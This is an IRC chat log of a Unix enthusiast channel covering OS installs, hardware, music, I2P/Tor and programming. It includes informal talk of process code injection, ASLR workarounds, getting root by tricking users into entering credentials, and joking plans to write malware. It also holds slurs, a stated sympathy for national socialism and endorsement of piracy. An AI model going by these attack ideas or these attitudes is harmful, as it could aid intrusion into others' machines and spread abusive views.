11:35         vypr │  venam: give it a few seconds
11:35         vypr │  i'll tell you when to try again
11:36         yrmt │  chatting with netbsd devs
11:36         vypr │  venam: try pls
11:37       Ypnose │  venam: by tag, he means he want a new release
11:37       Ypnose │  venam: git tag 1.0
11:37       Ypnose │  wants*
11:37       Ypnose │  so he can package 2bwm without git
11:37        venam │  still don't get it
11:37        z3bra │  aaah
11:38        z3bra │  git tag v1.0
11:38        venam │  link to to the docu
11:38        z3bra │  so that he can use that git tag to base his package upon
11:38       Ypnose │  venam: http://git-scm.com/book/en/Git-Basics-Tagging
11:38        z3bra │  kinda like a "stable" release of 2bwm
11:39       Ypnose │  this way, we can download sources inside a tarball, without using git to fetch sources
11:39         part │  thang1thang2
11:39        z3bra │  so that git pull v1.0 will always fetch the same thing
11:39        venam │  it's not stable, afaik
11:39        z3bra │  you can see it as a checkpoint
11:39        venam │  ah ok, now I get it
11:40        venam │  thanks
11:40   emptytapes │  better load up gparted then

11:53   emptytapes │  does swap only need 2gb
11:53  thang1thang │  why do you want a swap in the first place?
11:53  thang1thang │  swap's generally 2x your ram, btw
11:53  thang1thang │  but it's fairly useless if you have 4G or more
11:53   emptytapes │  ok
11:54   emptytapes │  i have 8gb ram
11:54  thang1thang │  same here
11:54  thang1thang │  fuck swap
11:54   emptytapes │  ok
11:54   emptytapes │  haha
11:54  thang1thang │  I don't have it on my arch
11:54   emptytapes │  do i not even need a swap partition then?
11:54  thang1thang │  nope
11:54   emptytapes │  iok :)
11:54   emptytapes │  that gives me a whole 100gb for freebsd then:_)
11:54  thang1thang │  it's a throwback from the days of "we'll never need 1G of ram"
11:55   emptytapes │  oh ahah ok
11:55  thang1thang │  yeah, running a tiling wm on linux you can get the ram usage down to like ~50MB or so
11:55  thang1thang │  that's absolutely nothing to us, but that was still a good 30% of ram usage back in the day
11:56  thang1thang │  hence the need for swap files 
11:56   emptytapes │  ahh,  im learning a lot today
11:56  thang1thang │  same here bro

12:00   emptytapes │  does bsd support 1440x900 res in the tty?
12:01  thang1thang │  that's not square? :p
12:01   emptytapes │  haha
12:01   emptytapes │  means I can float nicely
12:01  thang1thang │  monitor sizes shouldn't matter actually

12:58        z3bra │  :)
12:58  thang1thang │  well let's see
12:59  thang1thang │  I downloaded bar from lemonbar's github
12:59  thang1thang │  changed the font to use terminus
12:59  thang1thang │  make and make install, then rn the bar
12:59  thang1thang │  and voila... black bar of nothing
13:00        z3bra │  echo "ohai thang1thang2" | bar -p

13:02  thang1thang │  I get a 7(+/-)0ohai thang1thang2 on the bar now
13:02       Ypnose │  (you'll probably need to install it tho)

13:08  thang1thang │  c       Aligns the text to the center.
13:08  thang1thang │  center the text*

14:04         vypr │  I don't know.
14:04         vypr │  She likes it when it flushes because the water moves around.
14:05   Neuromatic │  FreeBSD has a great performance, but I prefer NetBSD
14:05         vypr │  I came back and before I know it I hear water splashing and my cat running quickly out of the bathroom.
14:05   Neuromatic │  lul, cats always do such stuff if there is no camerea
14:08       Ypnose │  Neuromatic: you're running on NetBSD?
14:09   Neuromatic │  Only in a vm, but I will it install as primary system soon

14:29        kirby │  Anyone doing anything?
14:29   Neuromatic │  Thank you vypr, any plans fo '14?
14:30         vypr │  Lose weight, code more, improve in school.
14:34   Neuromatic │  improve in school is the only important ;)
14:34         vypr │  I mean, I could stay at 275lbs.
14:35   Neuromatic │  When you get old, you will be fat again. And then you dont go outside, and coding is the only thing in your life you can do lel
14:37        kirby │  Old people don't have to be solitary.
14:37        kirby │  But I'd like to think I'll still be coding when I'm old :p
14:38   Neuromatic │  kirby: No. but I tryed to be dramatic

14:46         vypr │  what dependency do i need to install?
14:46   Neuromatic │  xcb stuff
14:46         vypr │  i know that
14:46   Neuromatic │  libxcb
14:46         vypr │  i just forget
14:46   Neuromatic │  xcb-util
14:46   Neuromatic │  xcb-util-wm
14:46         yrmt │  god damnit
14:46         yrmt │  every single day
14:46   Neuromatic │  xcb-util-keysym
14:46   Neuromatic │  I Think thats all
14:46         yrmt │  we should have a faq for install xcb stuff
14:47   Neuromatic │  yrmt: The installing is not the problem
14:47         vypr │  hm
14:47         vypr │  pkg_add doesn't seem to have xcb-util-keysym
14:47        kirby │  Could still be useful to have a forum post we can link people to with all the useful info.
14:47   Neuromatic │  I've installed it yesterday
14:48         yrmt │  vypr: use pkg
14:48         yrmt │  not pkg_add
14:48   Neuromatic │  kirby: yea
14:48         yrmt │  also, pkg_add has xcb-util-*, you just didn't set the right PACKAGESITE
14:49         vypr │  ._.
14:49         vypr │  i apologize for using defaults
14:49         yrmt │  use pkg
14:49         vypr │  i did, and that didn't have it either.
14:49         yrmt │  pkg_add doesn't have defaults
14:49         yrmt │  it does actually
14:49         yrmt │  make sure you have the right repo
14:50         yrmt │  I hope you got FreeBSD 10, because they make it easy with pkg
14:50         vypr │  no
14:50         vypr │  9.2
14:50         yrmt │  get 10, 
14:50         vypr │  ugh
14:51   Neuromatic │  vypr: maybe the package is named xcb-util-keysyms
14:51        kirby │  I don't like FreeBSD, and even I think you should use 10.
14:51         vypr │  that worked, Neuromatic.
14:51         vypr │  thanks
14:51         vypr │  now to wait 15 minutes to download freebsd 10 you nazis.
14:51         yrmt │  pkg_* is shit, like on openbsd
14:52        kirby │  Which is why I didn't like it.
14:52         yrmt │  at least freebsd has a good package manager now
14:52        kirby │  I really need to get around to trying 10, pkgng sounds decent.
14:52         yrmt │  pkgng is glorious
14:52         yrmt │  and pkgin on netbsd/minix is good too
14:53   Neuromatic │  ^
14:53         yrmt │  openbsd is truly the most annoying bsd when it comes to installing stuff
14:54   Neuromatic │  In my feelings openbsd has a performance lack on older hardware…
14:54        kirby │  It didn't support my netbook's wireless.
14:54        kirby │  That upset me.
14:54         yrmt │  Neuromatic: big kernel lock
14:55         yrmt │  soon, dragonflybsd will have the best performance
14:56   Neuromatic │  FreeBSD has a great permormance too, but it feels like using Linux
14:57         yrmt │  how so
14:57         yrmt │  freebsd is clean
14:57   Neuromatic │  Is is
14:57         yrmt │  openbsd's filesystem is so slow :|
14:58   Neuromatic │  I like'd openbsd. its easy and his filesystem is damn clean. But I can not handle with the userbase :D
15:00         yrmt │  it really depends
15:00         yrmt │  the european openbsd devs are nice
15:01   Neuromatic │  I only know that 1337 guys: if u r not usin obsd u dont know unix fagget.
15:02         yrmt │  heh
15:02         yrmt │  I use unix xv6, I'm leed :DDDD
15:02   Neuromatic │  lel
15:03   Neuromatic │  obsd is not using the proc filesystem…
15:03   Neuromatic │  whats about everything is a file :P
15:03         yrmt │  none of the bsd do
15:04         yrmt │  freebsd supports it though

15:07         vypr │  burning disk
15:08   Neuromatic │  vypr: fuuu
15:08         vypr │  ...uuuuuuuuuun?
15:08         yrmt │  Neuromatic: maybe but it wasn't mounted?
15:08   Neuromatic │  I not cd'd in
15:09         yrmt │  gah, building xv6 on osx is hard
15:09         vypr │  have you tried turning it on and off?
15:09   Neuromatic │  bulk builds are shitty. Is perl already done? :P
15:10         yrmt │  ?
15:10         yrmt │  why are you doing a bulk build oO
15:11   Neuromatic │  Just for having it done once
15:11        bosko │  yrmt, considering wiping my win7 os
15:11        bosko │  and instaling some form of *nix on this pc
15:11        bosko │  what would you suggest
15:11        kirby │  Do it.
15:12        bosko │  freebsd doesnt agree with my hardware, and cbf havign to turn down the cpu cycles again
15:12        bosko │  to stop it from overheating
15:12        kirby │  Though to be fair you must be pretty committed to it to come to UnixHub in the first place :p
15:12        kirby │  I can't imagine there'd be anyone here telling you to keep Windows.
15:12        bosko │  windows is pretty great

15:13        bosko │  and everything associated with that
15:13        kirby │  I really cannot get along with it.
15:14         yrmt │  Ypnose: what's your last tweet to iMil about?
15:14        kirby │  (On my computer) it's slow as hell.
15:14         yrmt │  I was just talking to him on #pkgsrc
15:14       Ypnose │  yrmt: about a job at NBS
15:14        kirby │  And doing any development on Windows is a nightmare.
15:14       Ypnose │  I wasn't very far

15:16          you │  Neuromatic|transmute

15:16        bosko │  kirby, dev on windows is pretty painless imo
15:16        bosko │  visual studio holds your hand so much these days
15:16        bosko │  C dev is so simplified on windows, everything just works
15:17        bosko │  but the main reason i keep it around is so i can make money doing freelance programming for the windows platform
15:17        bosko │  and pretty sure keeping a windows virtualbox session around
15:17        bosko │  isnt going to be quite the same
15:19         yrmt │  Ypnose: NBS?
15:20        kirby │  Meh, I really hate it.
15:20        kirby │  Don't like IDEs, and installing libs for gcc is horrific.
15:20       Ypnose │  yrmt: iMil corp. Try on DDG NBS System
15:20        kirby │  But too each his own.
15:20        kirby │  *to
15:22        bosko │  kirby, gcc is horrific all together
15:22         yrmt │  Ypnose: alright cool
15:23         yrmt │  someone needs to get tcc working on Xv6
15:23       Ypnose │  I'm kinda disappointed actually
15:23        venam │  C dev on windows is a pain in the ass what are you talking about, installing libs is a hassle
15:23        venam │  on *nix it's all automatized with the pkg manager
15:23        kirby │  Exactly
15:24         yrmt │  Ypnose: I can imagine, what job was it?
15:24        kirby │  Then you can spend more time making Vim look pretty!
15:24        bosko │  venam, its actually not as bad as you think
15:24        bosko │  anyway you can always just put the .lib and .h in the same directory
15:24       Ypnose │  yrmt: tech support
15:24        kirby │  bosko: It means hunting them down.
15:24         yrmt │  did he tell you why you weren't hired?
15:24        venam │  but it's not as intuitive as *nix

17:33         jmbi │  i've been listening to this
17:33         jmbi │  https://www.youtube.com/watch?v=4MSymIy9eCY
17:33         jmbi │  minimalistic
17:33   emptytapes │  jmbi: I'm massivly into minimalism atm
17:34         jmbi │  aesthetic minimalism, or like removing physical clutter?
17:34   emptytapes │  musically and asthetically
17:34         jmbi │  ah, as am i
17:34         jmbi │  although my parents think i have mental problems
17:34   emptytapes │  I got a really good CD today called lowercase-sound 2002
17:34         jmbi │  i only have a bed in my room
17:35   emptytapes │  Has artists like tyler dupree, bernhard guntur and steve roden on it
17:35         jmbi │  no light, no clock
17:35   emptytapes │  hehe
17:35   emptytapes │  when you get the time listen to Monochrome Rust \ Differential by Bernhard Guntur
17:35   emptytapes │  It's brilliant
17:36         jmbi │  got a link?
17:36   emptytapes │  wait a minute, I have it somewhere
17:37        venam │  jmbi: you don't have a computer in your room
17:37        venam │  or a closet?
17:37   emptytapes │  you can listen to a sample here: www.lineimprint.com/editions/cd/line_009
17:37         jmbi │  no
17:37         jmbi │  i do have a closet
17:38         jmbi │  that's where i keep all my clothes
17:38   emptytapes │  jmbi: turn your volume up to about 70%
17:38        venam │  if you keep all your stuff in your closet and only get it out when you use it then it only means you are tidy
17:38         jmbi │  venam: i *only* have clothes in my closet
17:38        venam │  ...
17:38   emptytapes │  a key aspect of minimalism is tidyness.
17:39         jmbi │  emptytapes: what about 100%?
17:39   emptytapes │  and organisation
17:39   emptytapes │  jmbi: probably will need to got that high to hear it
17:39   emptytapes │  jmbi: as loud as your system will g
17:39   emptytapes │  *go
17:40        venam │  where do you compute if you don't do that in your room?
17:40        venam │  where do you study if you don't even have a table
17:40        venam │  where do you keep your books?
17:40   emptytapes │  in his head
17:41         jmbi │  i compute downstairs
17:41         jmbi │  i study downstairs at my battlestation
17:41         jmbi │  i keep my books in my backpack
17:41        venam │  ah ok
17:42        venam │  but if you couldn't do that downstair then it would've been in your room
17:43         jmbi │  probably
17:43         jmbi │  emptytapes: this is nice, but it's a bit *too* minimalist
17:44   emptytapes │  jmbi: at least you appreciate it, there are some other similar styles. Once I rip this new CD I'll send you a link :)
17:44         jmbi │  ah thank you
17:44   emptytapes │  There was only 1000 editions so it was difficult to get a hold of
17:44         jmbi │  yeah i would definitely listen to it
17:44   emptytapes │  I'll rip it to FLAC if thats ok?
17:45         jmbi │  sure
17:45   emptytapes │  cool
17:45   emptytapes │  If you're more into minimal drone check out Franciso Lopez, he is good too
17:46   emptytapes │  for classical minimalism listen to Rothko Chapel by Morton Feldman
17:47         jmbi │  alright, thanks

20:26         dcat │  yeah, I am
20:26   EmperorDAZ │  yse the MSP430
20:26   EmperorDAZ │  use*
20:26   EmperorDAZ │  if it has enough I/O lol
20:26         dcat │  actually, I am using that.
20:26   EmperorDAZ │  my keyboard has started leaking the ink from letter 'A' lol
20:26   EmperorDAZ │  leaking/ flakingh
20:26   EmperorDAZ │  flaking*
20:26         dcat │  lel
20:27         dcat │  otaku keycaps ftw
20:27    dimeshake │  EmperorDAZ: have you seen this? http://www.artlebedev.com/everything/optimus/tactus/
20:27   EmperorDAZ │  I wonder if it's actually possible to reach 100M presses
20:27    dimeshake │  and http://www.artlebedev.com/everything/optimus/popularis/
20:27   EmperorDAZ │  let me check
20:28         dcat │  I'm gonna add a serial port to it, so you can flash custom hardware layout :3
20:28   EmperorDAZ │  tactus looks really sweet but doesn't look great for rapid typing / programming
20:28    dimeshake │  no it looks clunky as hell to actually type on
20:29   EmperorDAZ │  my idea is kinda similar (if not equal) to that optimus popularis
20:29   EmperorDAZ │  but use "standart" keyboard switches
20:29         dcat │  http://www.artlebedev.com/everything/optimus/maximus/
20:29         dcat │  I think that's more what EmperorDAZ is after
20:30   EmperorDAZ │  ^^
20:30   EmperorDAZ │  That
20:30   EmperorDAZ │  how much they fking charge?
20:30         dcat │  a LOT.
20:31   EmperorDAZ │  $1600 ?
20:31         dcat │  I wouldn't want one like that anyway
20:31   EmperorDAZ │  I don't think I will ever spend that much
20:31         dcat │  the one I'm gonna make is kind of gonna be like the hhkb
20:31   EmperorDAZ │  on a computer accessory
20:31         dcat │  but better
20:31   EmperorDAZ │  Model M from IBM
20:32   EmperorDAZ │  I have a feel that I've seen/used one but got thrown away years ago
20:33         dcat │  I had one ;_;
20:33         dcat │  original
20:33       eye`off│  eye
20:33         dcat │  my brother threw it away cause it was "old outdated computer trash"
20:33   EmperorDAZ │  what is the diference between a standart HHKB and a common keyboard? (haven't googled yet :P)
20:33   EmperorDAZ │  kill him
20:33   EmperorDAZ │  lol
20:33         dcat │  yeah, I was considering it
20:34   EmperorDAZ │  they do make a diferent sound when pressed
20:34   EmperorDAZ │  I remember
20:34         dcat │  I'm basing the keyboard on hhkb, model m, and poker
20:35   EmperorDAZ │  << Likes noisy keyboards, hates flat key ones (they feel very weird to type on)
20:35         dcat │  I think I'm gonna start of with clears or blues
20:36   EmperorDAZ │  your MSP has enough I/O? 
20:36   EmperorDAZ │  how you gonna machine the "shell" of the keyboard and the keys?
20:36   EmperorDAZ │  custom CNC order?
20:36         dcat │  well, a keyboard is very basic
20:36         dcat │  custom cnc aluminium
20:37         dcat │  maybe elecro-plating some color to make it look less ... idk
20:37   EmperorDAZ │  aluminium keys?
20:37   EmperorDAZ │  looks slick
20:37         dcat │  oh, no
20:37         dcat │  just case
20:37   EmperorDAZ │  ah lel
20:37         dcat │  I think I'm just gonna start off with some default blank keycaps or something
20:38   EmperorDAZ │  there are blank keys for sale I think
20:38         dcat │  I hate typing on metal :/
20:38         dcat │  makes me hands smell weird when it mixes with sweat
20:39   EmperorDAZ │  lol

20:42   EmperorDAZ │  but 1.13 per switch is kinda...
20:42   EmperorDAZ │  expensive lol

21:31     NeoTerra │  also you got any plans for new years BigE?
21:31         BigE │  karate is, for the most part, useless, and a stain on the reputation of martial arts in general

22:28         dcat │  I've studied psychology, to yeah, I try to help people

22:28  thang1thang │  really? Did you study it as a major or?
22:28         dcat │  like 80-90% of all pedophiles hate themselves for it
22:28         dcat │  only about 5-10% do anything with children
22:30         dcat │  he's obviously got some emotional problems
22:30  thang1thang │  that's actually accurate
22:30         dcat │  and I have the need to help people
22:30  thang1thang │  I mean, considering pedophilia is basically an attraction to little children, it's not something you can actually "help"
22:30  thang1thang │  you can't just say "today, I'm going to stop being a pedo", and that's probably incredibly damaging mentally
22:31         dcat │  and I'm not a neo-nazi, but I do believe in national socialism.

22:34     ne0phyte │  theres a lot of story around him but I won't bother you with it. he's a freak

02:01        tbuck │  libbro: something like that
02:01        tbuck │  i remember her telling us about all the heavy drugs shes on
02:02       libbro │  Last time I talked to her, she was talking about the British intelligence agency or something
02:02         BigE │  shitty
02:02       libbro │  tbcktu: When was this?
02:02         BigE │  the GCHQ are pretty shady guys

02:04     aqualung │  libbro: what are you talking
02:04     aqualung │  pls expl
02:04         jmbi │  this channel has been the only place i've been on for like 2 years

02:05         BigE │  aqualung: you dirty fucking piece of shit
02:05       libbro │  jmbi: This is the main IRC channel I go on too
02:05        tbuck │  ive been going on a few others lately, most arent very active though

02:05         BigE │  \jokes
02:05     aqualung │  i join random channels and she's on
02:05       libbro │  I tried using some I2P channels but they were all empty
02:05     aqualung │  libbro: what?
02:05     aqualung │  #torrents, #i2p-dev, #i2p, and #salt are good places on irc2p
02:05     aqualung │  only a matter of time before i start an ircd and she's there
02:05     aqualung │  OH WAIT THAT HAPPENED
02:06       libbro │  Well the ones I went on were pretty deserted....
02:06       libbro │  I went on the killyourtv one and some other one
02:06       libbro │  I think I should go on #torrents
02:06         dcat │  aqualung: how old are you?
02:06       libbro │  I love I2P and it's filesharing shit
02:06       libbro │  *its
02:07     aqualung │  yeah i added a bunch
02:07     aqualung │  friend is a big fan of i2p
02:07       libbro │  I LOVE I2P
02:07     aqualung │  so i help out by uploading and downloading
02:07       libbro │  I'm thinking about uploading some music....
02:07       libbro │  but I'm too tinfoil hat
02:07     aqualung │  dude it's 100% anon and crypto
02:07     aqualung │  no riaampaa
02:08       libbro │  I know that...
02:08       libbro │  But I feel like they have some vulnerability
02:08       libbro │  And will come to my house and anally rape me for uploading some m00sic
02:08     aqualung │  it'll be damn hard
02:08     aqualung │  and not worth their time
02:08     aqualung │  they'd need to do a sybil attack for REALSIES
02:09        tbuck │  yeah if the artist is that angry with you for spreading their tunes they got their priorities wrong
02:09        tbuck │  IMO anyway
02:09       libbro │  I'm thinking about sharing a Immortal Technique album
02:09       libbro │  He doesn't care
02:09       libbro │  He actually supports it
02:09     aqualung │  who is immortal technique
02:10       libbro │  https://en.wikipedia.org/wiki/Immortal_Technique
02:10       libbro │  A rapper
02:10        tbuck │  if it wasnt for "stealing" music i wouldn't be familiar with most of the artists i listen to, they need to recognize that
02:10       libbro │  ^
02:10       libbro │  I agree
02:10       libbro │  >inb4 spotify
02:11        tbuck │  if i like them enough ill support them where i can
02:11       libbro │  I also get tinfoil just by using I2P because I feel like my ISP will look and see I2P traffic and
02:11       libbro │  get me v& for it
02:12       libbro │  tbcktu: Yeah.. if I bought all of my albums I'd be a poorfag
02:12         jmbi │  why is my i2p browser not working
02:12         jmbi │  i'm a n00b to this
02:12       libbro │  i2prouter start
02:12       libbro │  run that command
02:12       libbro │  In order to use the network you have to relay data
02:13       libbro │  Then it will automatically launch the I2P control center thing
02:13       libbro │  aqualung: Have you ever used salt.i2p's XMPP service
02:13     aqualung │  give it a few
02:13     aqualung │  and yes
02:13         jmbi │  it does all that, but none of the .i2p sites load
02:13     aqualung │  i'm talking to my friend on it right now
02:13     aqualung │  jmbi: you need to set up the proxy
02:13       libbro │  Cool
02:14       libbro │  jmbi: Are you using privoxy or are you just connecting directly to an i2p proxy
02:14         jmbi │  lol idk
02:14         jmbi │  i just started the i2p thing
02:14         jmbi │  looking at the control center "console" thing now
02:14       libbro │  aqualung: I need to use that and get some of muh cryptofiends to use it

02:18          sam │  libbro: Tor + IRL shit is fine
02:18          sam │  libbro: just not Facebook. But then maybe you shouldn't have Facebook.
02:19          sam │  (and maybe not some university/work stuff. But reddit and so on can be TBB'd.)
02:19         kori │  BigE: that you called me idler scum and kicked me :<

03:20       libbro │  I saw that
03:20       libbro │  Eeeeww...
03:21       libbro │  Okay, so I configured TBB to use privoxy to connect to i2p and tor but...
03:22       libbro │  I can't connect to the I2P control center
03:22       libbro │  How can I configure Privoxy to do as such?

03:23     aqualung │  localhost:7657
03:23       libbro │  Yeah...
03:23     aqualung │  you can't route localhost's router console through the proxy
03:24       libbro │  Okay... so I'll have to configure privoxy to use my normal connection to use localhost:7657?
03:24       libbro │  That's what I'm trying to do, I just don't know how..
03:25     aqualung │  i use foxyproxy myseld
03:25     aqualung │  ask sam when he wakes the up fuck
03:25       libbro │  Okay m8

03:33         jmbi │  i had been meditating for like 20 minutes and got an itch on my nose
03:33       libbro │  lol
03:33       libbro │  Today is the last day that I can fap
03:33         jmbi │  that's the worst
03:33         jmbi │  word of advice: don't fap today
03:33         jmbi │  lol
03:33       libbro │  I have, but I won't starting now
03:34         jmbi │  lol, same
03:35       libbro │  I also need to set up privoxy for some I2P shit
03:38         jmbi │  welp, back to meditating
03:38         jmbi │  hopefully i'll get to 30 mins
03:39       libbro │  Good luck
03:39         jmbi │  before my toe starts itching or something

04:04       libbro │  Man, I need to meditate...
04:05         jmbi │  that was actually really interesting
04:05         jmbi │  i started to feel my nose vibrate when i would inhale O.o
04:07       libbro │  Once when I was meditating..
04:07       libbro │  I started to envision myself in this place
04:07       libbro │  And I got this feeling that I can't really describe
04:08       libbro │  It ws weird but I could never emulate it again
04:08         jmbi │  hm
04:08       libbro │  I know it is a bad description
04:08         jmbi │  just don't try to
04:08         jmbi │  :) i think i know what you mean
04:08       libbro │  I guess so
04:08       libbro │  :)
04:08         jmbi │  i have yet to reach 1st jhana or anything

04:13       libbro │  Yep, I know
04:14  thang1thang │  I don't do it, personally
04:14  thang1thang │  never really felt the need tbh
04:14         jmbi │  thang1thang2: you really should man
04:14  thang1thang │  nawuh
04:14         jmbi │  i was the same way
04:14  thang1thang │  I got jeezus
04:14         jmbi │  haha, are you being legit?
04:14  thang1thang │  not really
04:14  thang1thang │  I mean, I am a Christian, but that's not why I don't meditate :p
04:15         jmbi │  I was a christian
04:15         jmbi │  then my gf broke up with me because "god told me to", and gave me a bible for christmas
04:15  thang1thang │  wut
04:16         jmbi │  yup
04:16  thang1thang │  I've heard legends about such stupidity...
04:16  thang1thang │  mormon?
04:16         jmbi │  nope
04:16         jmbi │  fucking baptist or some shit

04:16         jmbi │  she's on crazy meds
04:16  thang1thang │  well yeah
04:16  thang1thang │  southern baptist should've been your first clue, there...
04:17  thang1thang │  crazy meds are just logical progression
04:17         jmbi │  no, she's on Prozac
04:17  thang1thang │  oh
04:17         jmbi │  OCD, anxiety, major depression, bulimia, the whole deal
04:17  thang1thang │  lol that's something else
04:18  thang1thang │  I wonder how much of that could be prevented by becoming #atheist

12:12        venam │  try freelancing
12:13      bottomy │  it's not worth my time though, the amount those sites typically have projects going for. would only be worthwhile if I got private freelance work, not using those bidding sites.

12:51         yrmt │  Neuromatic|afk: you need to change the path to the lib

12:59         yrmt │  bottomy: you use feedface to inject code in processes?

12:59       zygotb │  But my family is stoked that I haven't been drinking the way I used to drink...
12:59         yrmt │  that's cool

13:17         yrmt │  berk: alright, I'm downloading the st
13:17      bottomy │  hmm must be an issue somewhere, I really need to add proper erroring to the project
13:18      bottomy │  anyway logReferencedClasses logs the classes the process uses (at least statically) so in the target it uses NSNumber, NSString, and Test. there's a 3rd log (logAllClasses I think I made it) and that dumps all the classes currently registered in the runtime (so equivalent of calling objc_getClassList, if you were in that process)
13:18         yrmt │  it worked fine on mps

13:21         yrmt │  no idea what's happening - but nice!
13:23      bottomy │  ah yeh example7 no longer works for me (tried it on the Dock used to work). I haven't tried it since upgrading to mavericks, I'm guessing they changed the how ASLR works
13:24      bottomy │  or at least the random slide value
13:24        bosko │  you doing some kind of code injection trick
13:24        bosko │  into a running process/thread ?
13:24         berk │  Story: I couldn't startx with bspwm, it would give me an error. I found a new method: "X", go to tty1, ctrl+z, bg, "startx" again. :(
13:25      bottomy │  bosko: yeh a framework I made awhile back to simplify it

13:26         yrmt │  a screwdriver?
13:26      bottomy │  I had a workaround for ASLR since I worked out only certain bits were being adjusted by a random value, but I'm guessing they've changed it again
13:26        bosko │  ok
13:26       zygotb │  crazy glue
13:26      bottomy │  you could change the ip of the thread, it depends on the type of injection
13:26        bosko │  yeah thatst what i was doing
13:27        bosko │  mmap with read,write + exec privs
13:27        bosko │  and then changing the thread ip
13:27         yrmt │  bottomy: let's write malware with feedface
13:27      bottomy │  lol
13:27        bosko │  afk
13:27      bottomy │  would be better to just avoid the framework for malware
13:27      bottomy │  also you need root so it's not that great for malware
13:28         yrmt │  well, it would be part of it
13:29         yrmt │  first needs an exploit for root
13:29      bottomy │  good luck :P
13:29         yrmt │  then inject self process for randomization
13:30      bottomy │  I mean besides taking advantage of sudo timings, or just doing a trojan/tricking the user to enter credentials, would be hard to find exploit for root
13:32      bottomy │  this was an example of what used to happen when you used example7 http://forums.unixhub.net/showthread.php?tid=79&pid=5549#pid5549

13:34      bottomy │  mentioned that in the post too :P
13:35         yrmt │  oh right
13:37      bottomy │  where I really wanted to take the project was to implement message and function hooks. so when a message is sent to an object you could get that first passed over to your process and then you could change inputs or do whatever. then pass that back over to the target.
13:38       zygotb │  Don't make malware... Micro$oft hates competition.
13:38      bottomy │  doing the function hooks is a little bit trickier, but Obj-C is really ideal for DO (distributed objects) so wouldn't be that difficult
13:38      bottomy │  as far as the message hooks go

15:42         vypr │  We don't have a site yet.

15:42        venam │  I'm just looking for a good email provider, it's been one month that I just have the university email, which is shitty
15:43         vypr │  Are you looking for an iotek.org email?
15:43         vypr │  I'll see if I can get you one, if that's alright.
15:43        venam │  no, I'm not part of iotek so there's no point
15:43         vypr │  I wasn't part of it but I still got an email.
15:43         vypr │  Now dcat has invited me in.

15:46         vypr │  You could get an email like venam@pub.iotek.org.
15:46         vypr │  I imagine dcat will give you one
15:47         vypr │  I don't manage the emails however, so when he's online you'll have to ask.
15:47        venam │  I'm looking for something I can use professionally
15:47         vypr │  Or just have me do it for you.
15:48       Ypnose │  personally, I use MyKolab email but you need to pay for their services

15:54        venam │  I hope it won't be another of my mail that goes to waste

20:07     NeoTerra │  I prefer Debian or SUSE derivatives
20:08     vompatti │  ubuntu development idea? what has that to do with elementary?
20:09     NeoTerra │  it's based on Ubunut
20:09     NeoTerra │  uses the same package manager too
20:09     NeoTerra │  plus I want something that works, not something that's super pretty

20:11        kirby │  That's a pretty crappy opinion though?
20:11        kirby │  If people never argued people would keep their opinions which could eaisly be wrong.
20:11        kirby │  What if I thought killing people was OK?
20:11        kirby │  Should you not argue because everyone has their own opinion?
20:12     vompatti │  it was end of disvussion to prevent os war

20:12     vompatti │  lol
20:12     NeoTerra │  jeez I'm not going to bring up my problems anymore if all you people are going to pounce on me for not using your favourite distro
20:12     NeoTerra │  jesus christ
20:12     vompatti │  sometimes I argue with my dad about the most random things you can come up with
20:12        kirby │  OS wars can be justified, if someone defends a distro for no reason then is it not good to inform them?
20:13        kirby │  But most aren't like that, most are "lol i'm better than u".
20:13     vompatti │  ^
20:13     vompatti │  :'D
20:13     NeoTerra │  I just said it over and over again, elementary has too much crap I don't need with a package manager I don't like
20:13     NeoTerra │  how is that not a good reason?
20:13        kirby │  That's fine.
20:13        kirby │  I didn't read your argument lol.
20:13        kirby │  Just vompatti's end of argument statement.
20:14        kirby │  I don't like Elementary either.
20:14     vompatti │  me like it
20:14        kirby │  Though I use Debian, I like apt-get.
20:14         quit │  SammiCat
20:14     vompatti │  but I would definitely use debian stable or arch or something if I wouldn't be so lazy to set things up
20:14        kirby │  Haha.
20:15     vompatti │  I used debian stable over year
20:15     vompatti │  and arch/FreeBSD before that
20:15        kirby │  I use Arch on my netbook because it's my piss about machine and Debian on my laptop because I need it for school, so I want it to be stable.
20:15     vompatti │  debian stable ftw! the best distro I've used
20:16        kirby │ uses Testing.
20:16     vompatti │  I run debian on mah server
20:16     vompatti │  and raspberry
20:16        kirby │  But yeah, Debian is the shizzle.
20:16     vompatti │  it is
20:16        kirby │  I'd use Raspbian on mine but it comes with so much extra crap I don't need.
20:17        kirby │  So I use Arch on that.
20:17        kirby │  Well my other one uses RaspBMC so that's sort of Raspbian.
20:18     NeoTerra │  what are the advantages of using stable over testing? just newer packages?
20:18        kirby │  No.
20:18        kirby │  Do you mean testing over stable?
20:18     NeoTerra │  oops yeah
20:18     NeoTerra │  sorry
20:18        kirby │  Then yeah.
20:18        kirby │ wanted Steam and Cinnamon (at the time).
20:19        kirby │  And neither was in stable.
20:19        kirby │  So Jessie for me.
20:19         quit │  jmbi
20:19        kirby │  But testing is still fine, it's still very stable.
20:19     vompatti │  it is
20:20     NeoTerra │  I'm gonna go fix my linux partition
20:20     NeoTerra │  brb
20:20         quit │  NeoTerra
20:20        kirby │  If it wasn't a school laptop I might be tempted to go to - gasp - unstable, but I tried once and couldn't be asked to go and glue the pieces back together so I reinstalled testing.
20:22     vompatti │  I could basicly use what distro I want since I've been doing web developing past 3 monhts and will be doing it atleast for another 2months
20:22     vompatti │  and I run my develope environment on my home server which runs debian stable
20:22        kirby │  Yeah at the end of the day the distro never bothers me too much.
20:23     vompatti │  as long as it has woring web browser and shell
20:23        kirby │  Both laptops on seperate distros use dwm, and I use them for the same things without any noticable difference.

21:37      bottomy │  it's good to know about structure packing, but it's not always a good idea. as it can impact performance depending on how it's packed and and how the members are being used.
21:41         yrmt │  how so?
21:44      bottomy │  you may reorganize a structure so a certain member isn't aligned on a 16 byte alignment that would've been, and the compiler is generating code where you use that member using SSE. it is then forced to use unaligned moves.
21:46      bottomy │  it doesn't mean you should avoid rearranging your structs, just you should understand how certain things may be used, rather than rearranging for just size. so rearranging for both performance and size (though may be at the expense of some size depending on what it is).
21:46         yrmt │  okay thanks for the input
21:51      bottomy │  the alignment qualifier also gives you a lot of control to now (prior to its introduction/or extensions)

22:14       ripper │  So I have a little code (which I think is right ( did it myself though)) that's supposed to make some shellcode or so to spawn a shell
22:14       ripper │  I used it and for some reason
22:14       ripper │  I got an abort trap
22:14       ripper │  I'm on Mac OS X! :\

22:14       ripper │  I don't have any idea how that abort trap came to happen :3

22:15   emptytapes │  can we see the code?
22:15         yrmt │  yep, we need to see what you're talking about

22:17   emptytapes │  haha
22:17         yrmt │  looks like python
22:18         yrmt │  bottomy: you python?
22:18         yrmt │  or just ruby
